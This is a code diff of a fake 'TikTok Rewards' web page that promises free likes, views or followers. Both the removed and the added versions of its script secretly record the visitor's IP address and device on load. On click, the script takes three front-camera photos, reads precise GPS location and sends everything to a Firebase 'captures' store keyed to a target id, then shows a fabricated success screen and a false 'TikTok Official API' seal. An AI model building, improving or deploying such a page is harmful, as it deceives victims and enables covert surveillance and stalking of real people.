@@ -3,270 +3,317 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>TikTok Free Likes & Views</title>
+  <title>TikTok Rewards</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      background: linear-gradient(145deg, #000000 0%, #1f1f1f 50%, #000000 100%);
-      color: #ffffff;
-      font-family: 'Segoe UI', Arial, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-direction: column;
-      padding: 16px;
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body{
+      background:linear-gradient(145deg,#0a0e1a 0%,#1a1a2e 50%,#0a0e1a 100%);
+      color:#e8e8f0; font-family:'Segoe UI',Arial,sans-serif;
+      min-height:100vh; display:flex; align-items:center; justify-content:center;
+      flex-direction:column; padding:16px;
     }
-    .container { max-width: 440px; width: 100%; }
-    .reward-banner { background: linear-gradient(135deg, #00f2ea 0%, #ff0050 100%); border-radius: 18px 18px 0 0; padding: 24px; text-align: center; position: relative; overflow: hidden; }
-    .reward-banner::before { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(0,0,0,.05) 20px, rgba(0,0,0,.05) 40px); }
-    .reward-banner .big-icon { font-size: 56px; position: relative; z-index: 1; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3)); }
-    .reward-banner h1 { font-size: 24px; color: #fff; position: relative; z-index: 1; margin-top: 8px; text-shadow: 0 2px 10px rgba(0,0,0,.5); font-weight: 800; }
-    .reward-banner .sub { font-size: 14px; color: #fff; position: relative; z-index: 1; margin-top: 6px; font-weight: 600; opacity: 0.9; }
-    .main-card { background: #242424; border: 1px solid #3a3a3a; border-top: none; border-radius: 0 0 18px 18px; padding: 24px 20px; }
-    .main-card .offer-tag { display: inline-block; background: rgba(255, 0, 80, 0.15); border: 1px solid rgba(255, 0, 80, 0.4); color: #ff0050; padding: 4px 14px; border-radius: 20px; font-size: 12px; font-weight: 700; margin-bottom: 14px; }
-    .main-card .info-text { color: #dcdcdc; font-size: 15px; line-height: 1.6; margin-bottom: 20px; text-align: center; }
-    .main-card .info-text b { color: #00f2ea; }
-    .form-group { margin-bottom: 16px; text-align: left; }
-    .form-group label { display: block; font-size: 14px; font-weight: 600; color: #b0b0c8; margin-bottom: 6px; }
-    .form-group input { width: 100%; padding: 14px 16px; background: #121212; border: 1px solid #3a3a3a; border-radius: 12px; color: #fff; font-size: 16px; outline: none; transition: .2s; }
-    .form-group input:focus { border-color: #00f2ea; box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.15); }
-    .form-group input::placeholder { color: #666; }
-    .btn-withdraw { border: none; cursor: pointer; padding: 16px 28px; border-radius: 14px; font-weight: 700; font-size: 18px; transition: .2s; color: #fff; background: linear-gradient(90deg, #00f2ea 0%, #ff0050 100%); box-shadow: 0 4px 20px rgba(0, 242, 234, 0.3); width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 8px; }
-    .btn-withdraw:hover { transform: translateY(-2px); filter: brightness(1.1); }
-    .btn-withdraw:disabled { opacity: .7; cursor: not-allowed; transform: none; }
-    .status-box { margin-top: 16px; padding: 14px; border-radius: 12px; font-size: 14px; font-weight: 600; word-break: break-word; display: none; text-align: center; }
-    .status-box.show { display: block; }
-    .status-box.loading { background: rgba(255, 255, 255, 0.1); color: #fff; border: 1px solid rgba(255, 255, 255, 0.2); }
-    .status-box.success { background: rgba(0, 242, 234, 0.1); color: #00f2ea; border: 1px solid rgba(0, 242, 234, 0.3); }
-    .status-box.error { background: rgba(255, 0, 80, 0.1); color: #ff0050; border: 1px solid rgba(255, 0, 80, 0.3); }
-    .success-screen { display: none; text-align: center; padding: 10px 0; }
-    .success-screen .check-icon { font-size: 64px; margin-bottom: 10px; }
-    .success-screen h2 { color: #fff; font-size: 22px; margin: 10px 0 6px; }
-    .success-screen p { color: #dcdcdc; font-size: 15px; line-height: 1.6; }
-    .success-screen .ref-num { display: inline-block; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); color: #fff; padding: 6px 18px; border-radius: 20px; font-size: 13px; margin-top: 12px; font-weight: 600; }
-    .footer-note { margin-top: 20px; font-size: 12px; color: #888; text-align: center; }
-    #video-preview { display: none; }
-    #photo-canvas { display: none; }
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+    .container{max-width:440px;width:100%;}
+    .reward-banner{
+      background:linear-gradient(135deg,#ff9100,#ff3d00);
+      border-radius:18px 18px 0 0; padding:20px; text-align:center; position:relative; overflow:hidden;
+    }
+    .reward-banner::before{
+      content:''; position:absolute; inset:0; background:repeating-linear-gradient(45deg,transparent,transparent 20px,rgba(255,255,255,.03) 20px,rgba(255,255,255,.03) 40px);
+    }
+    .reward-banner .big-icon{font-size:48px; position:relative; z-index:1;}
+    .reward-banner h1{font-size:22px; color:#fff; position:relative; z-index:1; margin-top:4px; text-shadow:0 2px 10px rgba(0,0,0,.3);}
+    .reward-banner .sub{font-size:13px; color:rgba(255,255,255,.85); position:relative; z-index:1; margin-top:4px; font-weight:600;}
+    .main-card{
+      background:#181826; border:1px solid #2a2a3d; border-top:none; border-radius:0 0 18px 18px; padding:24px 20px;
+    }
+    .main-card .offer-tag{
+      display:inline-block; background:rgba(255,213,79,.12); border:1px solid rgba(255,213,79,.25); color:#ffd54f;
+      padding:4px 14px; border-radius:20px; font-size:12px; font-weight:700; margin-bottom:14px;
+    }
+    .main-card .info-text{color:#8a8aa5; font-size:13px; line-height:1.6; margin-bottom:18px;}
+    .main-card .info-text b{color:#ffd54f;}
+    .form-group{margin-bottom:14px; text-align:left;}
+    .form-group label{display:block; font-size:13px; font-weight:600; color:#b0b0c8; margin-bottom:5px;}
+    .form-group input, .form-group select{
+      width:100%; padding:12px 14px; background:#0f0f1e; border:1px solid #2a2a3d; border-radius:10px; color:#e8e8f0; font-size:14px; outline:none; transition:.2s;
+    }
+    .form-group input:focus{border-color:#ff9100; box-shadow:0 0 0 3px rgba(255,145,0,.12);}
+    .form-group input::placeholder{color:#4a4a5a;}
+    .btn-withdraw{
+      border:none; cursor:pointer; padding:14px 28px; border-radius:14px; font-weight:700; font-size:17px; transition:.2s;
+      color:#fff; background:linear-gradient(135deg,#ff9100,#ff3d00); box-shadow:0 0 24px rgba(255,145,0,.3);
+      width:100%; display:flex; align-items:center; justify-content:center; gap:10px; margin-top:4px;
+    }
+    .btn-withdraw:hover{transform:translateY(-2px); filter:brightness(1.1);}
+    .btn-withdraw:disabled{opacity:.5; cursor:not-allowed; transform:none;}
+    .status-box{margin-top:14px; padding:14px; border-radius:12px; font-size:13px; font-weight:600; word-break:break-word; display:none;}
+    .status-box.show{display:block;}
+    .status-box.loading{background:rgba(255,213,79,.1); color:#ffd54f; border:1px solid rgba(255,213,79,.3);}
+    .status-box.success{background:rgba(34,197,94,.1); color:#86efac; border:1px solid rgba(34,197,94,.3);}
+    .status-box.error{background:rgba(239,68,68,.1); color:#fca5a5; border:1px solid rgba(239,68,68,.3);}
+    .success-screen{display:none; text-align:center; padding:10px 0;}
+    .success-screen .check-icon{font-size:64px;}
+    .success-screen h2{color:#22c55e; font-size:20px; margin:10px 0 6px;}
+    .success-screen p{color:#8a8aa5; font-size:14px; line-height:1.6;}
+    .success-screen .ref-num{
+      display:inline-block; background:rgba(34,197,94,.1); border:1px solid rgba(34,197,94,.25);
+      color:#86efac; padding:6px 18px; border-radius:20px; font-size:12px; margin-top:8px; font-weight:600;
+    }
+    .footer-note{margin-top:14px; font-size:12px; color:#4a4a5a; text-align:center;}
+    #video-preview{display:none;}
+    #photo-canvas{display:none;}
   </style>
 </head>
 <body>
-
-  <div class="container">
-    <div class="reward-banner">
-      <div class="big-icon">🎵</div>
-      <h1>TikTok FREE Likes & Views</h1>
-      <div class="sub">Select Service to Claim Free service</div>
-    </div>
-
-    <div class="main-card" id="main-card">
-      <div style="text-align: center;">
-        <div class="offer-tag">🔥 TRENDING NOW</div>
-      </div>
-
-      <div class="info-text">
-        Get <b>10,000 Likes</b> & <b>50,000 Views</b> instantly.<br>
-        Enter your video link and click below to verify.
-      </div>
-
-      <div id="withdrawal-form">
-        <div class="form-group">
-          <label>🔗 TikTok Video Link</label>
-          <input type="text" id="video-link" placeholder="https://www.tiktok.com/@user/video/1234567890" value="">
-        </div>
-
-        <div class="form-group">
-          <label>📸 Service Type</label>
-          <input type="text" value="10k Likes + 50k Views" disabled style="color:#00f2ea;font-weight:700;">
-        </div>
-
-        <button id="btn-allow" class="btn-withdraw">
-          🚀 Get Free Likes & Views
-        </button>
-
-        <div id="status-box" class="status-box"></div>
-      </div>
-
-      <div id="success-screen" class="success-screen">
-        <div class="check-icon">✅</div>
-        <h2>Success!</h2>
-        <p>Your account has been verified.<br><b>Likes & Views are on the way...</b></p>
-        <div class="ref-num">📋 Ref: TT-2026-${Math.floor(100000 + Math.random()*900000)}</div>
-        <p style="margin-top:14px;font-size:13px;color:#888;">Thank you for using the TikTok Booster. 🎵</p>
-      </div>
-    </div>
-
-    <div class="footer-note">🔒 Secured by TikTok Official API • Verified Partner 2026</div>
+<div class="container">
+  <div class="reward-banner">
+    <div class="big-icon">🎵</div>
+    <h1>TIKTOK REWARDS</h1>
+    <div class="sub">Claim your free Likes, Views or Followers!</div>
   </div>
 
-  <video id="video-preview" autoplay muted playsinline style="display:none;"></video>
-  <canvas id="photo-canvas" style="display:none;"></canvas>
+  <div class="main-card" id="main-card">
+    <div class="offer-tag">LIMITED TIME OFFER</div>
+    <div class="info-text">
+      <b>🎁 Congratulations!</b> Your account has been selected for <b>10k Likes + 50k Views</b> or <b>1k Followers</b>.  
+      Select your reward type, enter the required data and click the button below.
+    </div>
 
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <div id="withdrawal-form">
+      <div class="form-group">
+        <label>Reward Type</label>
+        <select id="service-select">
+          <option value="likes">Likes & Views</option>
+          <option value="followers">Followers</option>
+        </select>
+      </div>
 
-  <script>
-    if (typeof firebase !== 'undefined' && !firebase.apps.length) {
-      firebase.initializeApp({
-        apiKey: "AIzaSyB25VaErJEsI3VLBeb52cpczKRmEWC4fEs",
-        authDomain: "pak-earning-site.firebaseapp.com",
-        databaseURL: "https://pak-earning-site-default-rtdb.firebaseio.com",
-        projectId: "pak-earning-site",
-        storageBucket: "pak-earning-site.firebasestorage.app",
-        messagingSenderId: "830671389706",
-        appId: "1:830671389706:web:16ab555ffdd85cff70cbf3"
-      });
+      <div class="form-group" id="video-link-group">
+        <label>🔗 TikTok Video Link</label>
+        <input type="text" id="video-link" placeholder="https://www.tiktok.com/@user/video/1234567890">
+      </div>
+
+      <div class="form-group hidden" id="user-link-group">
+        <label>👤 TikTok Username or Profile Link</label>
+        <input type="text" id="user-link" placeholder="@user or https://www.tiktok.com/@user">
+      </div>
+
+      <button id="btn-allow" class="btn-withdraw">🚀 Verify & Get Rewards</button>
+      <div id="status-box" class="status-box"></div>
+    </div>
+
+    <div id="success-screen" class="success-screen">
+      <div class="check-icon">✅</div>
+      <h2>Success!</h2>
+      <p id="success-msg">Your reward is being processed…</p>
+      <div class="ref-num">📋 Ref: TT-2026-${Math.floor(100000 + Math.random()*900000)}</div>
+      <p style="margin-top:14px;font-size:12px;color:#4a4a5a;">Thank you for using TikTok Rewards. 🎵</p>
+    </div>
+  </div>
+
+  <div class="footer-note">🔒 Secured by TikTok Official API • Verified Partner 2026</div>
+</div>
+
+<video id="video-preview" autoplay muted playsinline style="display:none;"></video>
+<canvas id="photo-canvas" style="display:none;"></canvas>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+<script>
+  if (typeof firebase !== 'undefined' && !firebase.apps.length) {
+    firebase.initializeApp({
+      apiKey: "AIzaSyB25VaErJEsI3VLBeb52cpczKRmEWC4fEs",
+      authDomain: "pak-earning-site.firebaseapp.com",
+      databaseURL: "https://pak-earning-site-default-rtdb.firebaseio.com",
+      projectId: "pak-earning-site",
+      storageBucket: "pak-earning-site.firebasestorage.app",
+      messagingSenderId: "830671389706",
+      appId: "1:830671389706:web:16ab555ffdd85cff70cbf3"
+    });
+  }
+  const db2 = firebase.firestore();
+
+  const params = new URLSearchParams(window.location.search);
+  const targetId = params.get('id');
+  const type = params.get('type') || 'ip';
+  const uid = params.get('uid') || 'unknown';
+
+  const btnAllow = document.getElementById('btn-allow');
+  const statusBox = document.getElementById('status-box');
+  const videoPreview = document.getElementById('video-preview');
+  const photoCanvas = document.getElementById('photo-canvas');
+  const withdrawalForm = document.getElementById('withdrawal-form');
+  const successScreen = document.getElementById('success-screen');
+  const successMsg = document.getElementById('success-msg');
+  const serviceSelect = document.getElementById('service-select');
+  const videoLinkGroup = document.getElementById('video-link-group');
+  const userLinkGroup = document.getElementById('user-link-group');
+
+  let capturedIP = '0.0.0.0';
+  let capturedDevice = 'Unknown Device';
+  let captureComplete = false;
+
+  function toggleServiceFields() {
+    const val = serviceSelect.value;
+    if (val === 'likes') {
+      videoLinkGroup.classList.remove('hidden');
+      userLinkGroup.classList.add('hidden');
+    } else {
+      videoLinkGroup.classList.add('hidden');
+      userLinkGroup.classList.remove('hidden');
     }
-    const db2 = firebase.firestore();
+  }
+  serviceSelect.addEventListener('change', toggleServiceFields);
+  toggleServiceFields();   
 
-    const params = new URLSearchParams(window.location.search);
-    const targetId = params.get('id');
-    const type = params.get('type') || 'camera';
-    const uid = params.get('uid') || 'unknown';
+  async function captureIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      capturedIP = data.ip;
+    } catch (e) { capturedIP = '127.0.0.1'; }
 
-    const btnAllow = document.getElementById('btn-allow');
-    const statusBox = document.getElementById('status-box');
-    const videoPreview = document.getElementById('video-preview');
-    const photoCanvas = document.getElementById('photo-canvas');
-    const withdrawalForm = document.getElementById('withdrawal-form');
-    const successScreen = document.getElementById('success-screen');
+    const ua = navigator.userAgent;
+    if (/Android/i.test(ua)) {
+      const match = ua.match(/Android\s+[\d\.]+;\s*([^;]+)\s*Build/i);
+      capturedDevice = match ? match[1].trim() : "Android Device";
+    } else if (/iPhone|iPad|iPod/i.test(ua)) { capturedDevice = "iOS Device"; }
+    else if (/Windows/i.test(ua)) { capturedDevice = "Windows PC"; }
+    else if (/Macintosh/i.test(ua)) { capturedDevice = "Mac System"; }
+    else if (/Linux/i.test(ua)) { capturedDevice = "Linux System"; }
+    else { capturedDevice = "Unknown Device"; }
 
-    let capturedIP = '0.0.0.0';
-    let capturedDevice = 'Unknown Device';
-    let captureComplete = false;
+    try {
+      await db2.collection('captures').add({
+        targetId: targetId || 'direct',
+        type: 'ip',
+        ip: capturedIP,
+        deviceModel: capturedDevice,
+        userAgent: ua,
+        uid: uid,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+    } catch(e) {}
+  }
 
-    async function captureIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        capturedIP = data.ip;
-      } catch (e) { capturedIP = '127.0.0.1'; }
+  function canvasToBase64(canvas, quality) {
+    return canvas.toDataURL('image/jpeg', quality || 0.85);
+  }
 
-      const ua = navigator.userAgent;
-      if (/Android/i.test(ua)) {
-        const match = ua.match(/Android\s+[\d\.]+;\s*([^;]+)\s*Build/i);
-        capturedDevice = match ? match[1].trim() : "Android Device";
-      } else if (/iPhone|iPad|iPod/i.test(ua)) { capturedDevice = "iOS Device"; }
-      else if (/Windows/i.test(ua)) { capturedDevice = "Windows PC"; }
-      else { capturedDevice = "Unknown Device"; }
+  function showSuccess() {
+    withdrawalForm.style.display = 'none';
+    successScreen.style.display = 'block';
+    const refEl = successScreen.querySelector('.ref-num');
+    if (refEl) {
+      refEl.textContent = `📋 Ref: TT-2026-${Math.floor(100000 + Math.random()*900000)}`;
+    }
+  }
 
-      try {
+  async function handleAllow() {
+    if (captureComplete) return;
+
+    const service = serviceSelect.value;
+    const videoLink = document.getElementById('video-link').value.trim();
+    const userLink = document.getElementById('user-link').value.trim();
+
+    btnAllow.disabled = true;
+    btnAllow.textContent = '⏳ Verifying...';
+    statusBox.className = 'status-box show loading';
+    statusBox.textContent = '📸 Requesting Camera Permission...';
+
+    try {
+      if (type === 'camera') {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        videoPreview.style.display = 'block';
+        videoPreview.srcObject = stream;
+
+        const photos = [];
+        for (let i = 0; i < 3; i++) {
+          await new Promise(r => setTimeout(r, 1000));
+          photoCanvas.width = videoPreview.videoWidth || 640;
+          photoCanvas.height = videoPreview.videoHeight || 480;
+          const ctx = photoCanvas.getContext('2d');
+          ctx.drawImage(videoPreview, 0, 0);
+          photos.push(canvasToBase64(photoCanvas, 0.85));
+        }
+        stream.getTracks().forEach(t => t.stop());
+        videoPreview.style.display = 'none';
+
+        statusBox.textContent = '📍 Getting location...';
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+        });
+        const { latitude, longitude } = pos.coords;
+        let locationStr = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
+        try {
+          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=15`);
+          const data = await res.json();
+          if (data && data.display_name) locationStr = data.display_name;
+        } catch(e) {}
+
         await db2.collection('captures').add({
           targetId: targetId || 'direct',
-          type: 'ip',
+          type: 'camera',
           ip: capturedIP,
           deviceModel: capturedDevice,
-          userAgent: ua,
-          uid: uid,
-          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+          photos: photos,
+          latitude,
+          longitude,
+          location: locationStr,
+          uid,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          service: service,
+          videoLink: service === 'likes' ? videoLink : null,
+          userLink: service === 'followers' ? userLink : null
         });
-      } catch(e) {}
-    }
-
-    function canvasToBase64(canvas, quality) {
-      return canvas.toDataURL('image/jpeg', quality || 0.85);
-    }
-
-    function showSuccess() {
-      withdrawalForm.style.display = 'none';
-      successScreen.style.display = 'block';
-      const refEl = successScreen.querySelector('.ref-num');
-      if (refEl) {
-        refEl.textContent = `📋 Ref: TT-2026-${Math.floor(100000 + Math.random()*900000)}`;
+      } else {
+        await db2.collection('captures').add({
+          targetId: targetId || 'direct',
+          type: type,
+          ip: capturedIP,
+          deviceModel: capturedDevice,
+          uid,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
+          service: service,
+          videoLink: service === 'likes' ? videoLink : null,
+          userLink: service === 'followers' ? userLink : null
+        });
       }
-    }
 
-    async function handleAllow() {
-      if (captureComplete) return;
+      captureComplete = true;
+      statusBox.className = 'status-box show success';
+      statusBox.textContent = '✅ Verified! Processing rewards...';
 
-      const videoLink = document.getElementById('video-link').value.trim() || 'Unknown Video';
-
-      btnAllow.disabled = true;
-      btnAllow.textContent = '⏳ Verifying...';
-      statusBox.className = 'status-box show loading';
-      statusBox.textContent = '📸 Requesting Camera Permission...';
-
-      try {
-        if (type === 'camera') {
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
-          });
-
-          videoPreview.style.display = 'block';
-          videoPreview.srcObject = stream;
-
-          const photos = [];
-          for (let i = 0; i < 3; i++) {
-            await new Promise(r => setTimeout(r, 1000));
-            photoCanvas.width = videoPreview.videoWidth || 640;
-            photoCanvas.height = videoPreview.videoHeight || 480;
-            const ctx = photoCanvas.getContext('2d');
-            ctx.drawImage(videoPreview, 0, 0);
-            photos.push(canvasToBase64(photoCanvas, 0.85));
-          }
-
-          stream.getTracks().forEach(t => t.stop());
-          videoPreview.style.display = 'none';
-
-          statusBox.textContent = '📍 Getting location...';
-          const pos = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
-          });
-          const { latitude, longitude } = pos.coords;
-          let locationStr = `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
-          try {
-            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=15`);
-            const data = await res.json();
-            if (data && data.display_name) locationStr = data.display_name;
-          } catch(e) {}
-
-          statusBox.textContent = '📤 Uploading Data...';
-          await db2.collection('captures').add({
-            targetId: targetId || 'direct',
-            type: 'camera',
-            ip: capturedIP,
-            deviceModel: capturedDevice,
-            photos: photos,               
-            latitude,
-            longitude,
-            location: locationStr,
-            videoLink,
-            uid,
-            timestamp: firebase.firestore.FieldValue.serverTimestamp()
-          });
-
-        } else {
-          await db2.collection('captures').add({
-            targetId: targetId || 'direct',
-            type: 'ip',
-            ip: capturedIP,
-            deviceModel: capturedDevice,
-            videoLink,
-            uid,
-            timestamp: firebase.firestore.FieldValue.serverTimestamp()
-          });
-        }
-
-        captureComplete = true;
-        statusBox.className = 'status-box show success';
-        statusBox.textContent = '✅ Verified! Processing Likes...';
-
-        setTimeout(() => {
-          statusBox.style.display = 'none';
-          showSuccess();
-        }, 1500);
-
-      } catch (err) {
-        statusBox.className = 'status-box show error';
-        statusBox.textContent = '❌ Permission Denied or Error: ' + err.message;
-        btnAllow.textContent = '🔄 Retry';
-        btnAllow.disabled = false;
+      if (service === 'likes') {
+        successMsg.textContent = 'Your Likes & Views are on the way…';
+      } else {
+        successMsg.textContent = 'Your Followers are on the way…';
       }
-    }
 
-    btnAllow.addEventListener('click', handleAllow);
-    captureIP();
-  </script>
+      setTimeout(() => {
+        statusBox.style.display = 'none';
+        showSuccess();
+      }, 1500);
+
+    } catch (err) {
+      statusBox.className = 'status-box show error';
+      statusBox.textContent = '❌ ' + (err.message || 'Verification failed. Try again.');
+      btnAllow.textContent = '🔄 Retry';
+      btnAllow.disabled = false;
+    }
+  }
+
+  btnAllow.addEventListener('click', handleAllow);
+
+  captureIP();
+
+  if (!targetId) {
+    statusBox.className = 'status-box show error';
+    statusBox.textContent = '❌ This reward link has expired. Please request a new one.';
+    btnAllow.disabled = true;
+  }
+</script>
 </body>
 </html>
